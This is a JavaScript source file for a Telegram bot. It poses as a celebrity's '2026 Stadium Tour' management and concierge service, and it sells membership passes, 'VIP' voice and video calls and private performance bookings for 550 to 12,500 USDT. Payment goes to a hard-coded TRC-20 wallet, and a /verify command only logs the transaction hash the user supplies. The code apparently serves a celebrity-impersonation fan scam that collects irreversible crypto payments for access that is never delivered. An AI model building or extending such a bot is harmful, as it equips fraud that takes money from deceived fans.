require('dotenv').config();
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const { PrismaClient } = require('@prisma/client');

const prisma = new PrismaClient();
const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

app.use(express.json());

// Enhanced Management Configuration with premium tiers starting at $550 minimum
const CAMPAIGN_CONFIG = {
  SURVEY_HUB_URL: "https://fan-survey-hub.vercel.app/",
  LIVE_PORTAL_URL: "https://stilltheproblem-live.netlify.app/",
  DASHBOARD_URL: "https://stilltheproblem-live.netlify.app/dashboard.html",
  USDT_TRC20_WALLET: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Master receipt wallet
  
  // Premium Management & Interactive Pricing Tiers
  TIERS: {
    BRONZE: { name: "Bronze Backstage Membership", price: 550 },
    SILVER: { name: "Silver Inner Circle Pass", price: 1000 },
    GOLD: { name: "Gold All-Access Management Tier", price: 3000 },
    VIP_VOICE: { name: "Priority VIP Voice Call Request", price: 1500 },
    VIP_VIDEO: { name: "Exclusive 1-on-1 VIP Video Call Session", price: 4500 },
    ELITE_BOOKING: { name: "Official Private Event / Performance Booking Engagement", price: 12500 }
  }
};

// Global Middleware to auto-register or pull users from the SQLite database
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  try {
    const telegramId = BigInt(ctx.from.id);
    ctx.dbUser = await prisma.user.upsert({
      where: { telegramId },
      update: { 
        username: ctx.from.username || null, 
        firstName: ctx.from.first_name 
      },
      create: { 
        telegramId, 
        username: ctx.from.username || null, 
        firstName: ctx.from.first_name 
      },
    });
  } catch (err) {
    console.error('❌ User synchronization error:', err);
  }
  return next();
});

// Helper: Standard Main Menu Keyboard Layout
const getMainMenuKeyboard = () => {
  return Markup.inlineKeyboard([
    [Markup.button.url('📋 Complete Fan Consensus Survey', CAMPAIGN_CONFIG.SURVEY_HUB_URL)],
    [Markup.button.url('🌐 Access Live Concert Portal', CAMPAIGN_CONFIG.LIVE_PORTAL_URL)],
    [Markup.button.callback('🎟 View Premium Tiers & Memberships', 'menu_memberships')],
    [Markup.button.callback('📞 Schedule Calls & Bookings', 'menu_interactions')],
    [Markup.button.callback('🤝 Contact Management Team', 'menu_management')],
    [Markup.button.callback('👤 My Account Profile', 'menu_account')]
  ]);
};

// Command: /start
bot.start((ctx) => {
  const name = ctx.from.first_name || 'there';
  return ctx.reply(
    `👋 Welcome to the 2026 Stadium Tour Assistant & Premium Concierge Platform, ${name}!\n\n` +
    `This platform serves as the automated management node to streamline your interaction, unlock official live event trackers, participate in community initiatives, or request secure corporate bookings and private talent access.`,
    getMainMenuKeyboard()
  );
});

// Action: Go to Start (Navigation Reset)
bot.action('go_start', async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply('🎛 Explore the management modules below:', getMainMenuKeyboard());
});

// Action: View Memberships Module
bot.action('menu_memberships', async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply(
    '✨ *Select an Official Subscription/Membership Tier:*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback(`🥉 Bronze Pass — ${CAMPAIGN_CONFIG.TIERS.BRONZE.price} USDT`, 'pay_bronze')],
        [Markup.button.callback(`🥈 Silver Pass — ${CAMPAIGN_CONFIG.TIERS.SILVER.price} USDT`, 'pay_silver')],
        [Markup.button.callback(`🥇 Gold Pass — ${CAMPAIGN_CONFIG.TIERS.GOLD.price} USDT`, 'pay_gold')],
        [Markup.button.url('📊 Open Live Dashboard', CAMPAIGN_CONFIG.DASHBOARD_URL)],
        [Markup.button.callback('⬅️ Back to Main Menu', 'go_start')]
      ])
    }
  );
});

// Action: Schedule Calls & Bookings Module
bot.action('menu_interactions', async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply(
    '⚡ *Official Interactive Requests & Corporate Bookings:*\n\n' +
    'Select a specialized routing pipeline to request direct vocal or video access. Each request is verified automatically on-chain prior to calendar scheduling sync.',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback(`🔊 VIP Voice Call Request — ${CAMPAIGN_CONFIG.TIERS.VIP_VOICE.price} USDT`, 'pay_vip_voice')],
        [Markup.button.callback(`📹 VIP Video Call Session — ${CAMPAIGN_CONFIG.TIERS.VIP_VIDEO.price} USDT`, 'pay_vip_video')],
        [Markup.button.callback(`🎸 Private Booking / Performance Engagement`, 'pay_elite_booking')],
        [Markup.button.callback('⬅️ Back to Main Menu', 'go_start')]
      ])
    }
  );
});

// Action: Contact Management Flow
bot.action('menu_management', async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply(
    '🤝 *Management Desk Support Router*\n\n' +
    '• To view real-time operations or check user verification rosters, open your browser dashboard.\n' +
    '• For ongoing priority support, file an escalations review or purchase a premium allocation tier to automatically unlock priority direct messaging channels with operations personnel.',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('📊 Open Operational Dashboard', CAMPAIGN_CONFIG.DASHBOARD_URL)],
        [Markup.button.callback('⬅️ Back to Main Menu', 'go_start')]
      ])
    }
  );
});

// Reusable Invoice Engine Factory for Clean Processing
const generateInvoiceAction = (actionName, tierKey) => {
  bot.action(actionName, async (ctx) => {
    await ctx.answerCbQuery();
    const targetTier = CAMPAIGN_CONFIG.TIERS[tierKey];
    return ctx.reply(
      `💳 *Secure Ledger Payment Invoice*\n\n` +
      `• *Purpose:* ${targetTier.name}\n` +
      `• *Price Allocation:* *${targetTier.price} USDT*\n` +
      `• *Receiving Network:* *TRON (TRC-20)*\n\n` +
      `*Destination Wallet Address:*\n\`${CAMPAIGN_CONFIG.USDT_TRC20_WALLET}\`\n\n` +
      `⚠️ _Important: You must transfer native TRC-20 tokens. Sending other crypto types or using unmapped blockchains results in permanent structural loss._\n\n` +
      `Once your transaction is broadcast to the node, execute verification via terminal command layout:\n` +
      `\`/verify ${tierKey.toLowerCase()} YOUR_TRANSACTION_HASH\``,
      { 
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Return to Backing Options', 'go_start')]])
      }
    );
  });
};

// Auto-build all premium interactive workflows
generateInvoiceAction('pay_bronze', 'BRONZE');
generateInvoiceAction('pay_silver', 'SILVER');
generateInvoiceAction('pay_gold', 'GOLD');
generateInvoiceAction('pay_vip_voice', 'VIP_VOICE');
generateInvoiceAction('pay_vip_video', 'VIP_VIDEO');
generateInvoiceAction('pay_elite_booking', 'ELITE_BOOKING');

// Action: View Profile Status Data Map
bot.action('menu_account', async (ctx) => {
  await ctx.answerCbQuery();
  const user = ctx.dbUser;
  return ctx.reply(
    `👤 *Your Account Architecture Overview*\n\n` +
    `• *Database ID:* \`${user.id}\`\n` +
    `• *Telegram Handle ID:* \`${user.telegramId.toString()}\`\n` +
    `• *Profile Record Name:* ${user.firstName || 'Not Specified'}\n` +
    `• *Username Routing:* ${user.username ? `@${user.username}` : 'None'}\n\n` +
    `_Note: Access privileges and interactive booking permissions scale dynamically when pending on-chain validation transactions finish syncing._`,
    { 
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Back to Main Menu', 'go_start')]])
    }
  );
});

// Dynamic Verification Core Terminal Endpoint
bot.command('verify', async (ctx) => {
  const args = ctx.message.text.split(' ');
  if (args.length < 3) {
    return ctx.reply('❌ Invalid layout format.\nExecution Structure: `/verify [tier_type] [your_transaction_hash]`');
  }

  const tierInput = args[1].toUpperCase();
  const txHash = args[2];

  if (!CAMPAIGN_CONFIG.TIERS[tierInput]) {
    return ctx.reply('❌ Unmapped tier category type. Available options: bronze, silver, gold, vip_voice, vip_video, elite_booking.');
  }

  const validatedPrice = CAMPAIGN_CONFIG.TIERS[tierInput].price;

  try {
    await prisma.payment.create({
      data: {
        txHash: txHash,
        userId: ctx.dbUser.id,
        amountCrypto: validatedPrice,
        cryptocurrency: 'USDT_TRC20',
        status: 'pending_verification'
      }
    });

    return ctx.reply(
      `✅ *Cryptographic Verification Request Logged!*\n\n` +
      `Your transaction hash ending in \`...${txHash.slice(-6)}\` has been securely submitted to the management ledger database.\n\n` +
      `Once confirmed by our live background script or admin operators on your personal tracking dashboard at ${CAMPAIGN_CONFIG.DASHBOARD_URL}, your interaction access will upgrade automatically.`,
      { parse_mode: 'Markdown' }
    );
  } catch (err) {
    if (err.code === 'P2002') {
      return ctx.reply('❌ Duplicate Entry Error: This transaction signature has already been submitted for evaluation.');
    }
    console.error('Database write exception:', err);
    return ctx.reply('❌ Internal backend database failure tracking verification hash sequence.');
  }
});

// Management/Admin Support Direct-Line Broadcast Commands
bot.command('admin', (ctx) => {
  return ctx.reply(
    `🖥 *Automated Management Console Interface*\n\n` +
    `• Admin Portal: ${CAMPAIGN_CONFIG.DASHBOARD_URL}\n` +
    `• Core Purpose: Tracking fan consensus profiles, monitoring verification logs, and scheduling verified audio/video interactions.`,
    { parse_mode: 'Markdown' }
  );
});

// Spin up HTTP Server and launch Bot Engine
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Web server interface active on port :${PORT}`));
app.get('/', (req, res) => {
  res.send('🚀 Automated Celebrity Management & Outreach Node is processing successfully.');
});

bot.launch()
  .then(() => console.log('🤖 Management Bot Engine is online and polling transaction streams!'))
  .catch((err) => console.error('Failed to boot Telegram engine:', err));

// Graceful termination handling
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
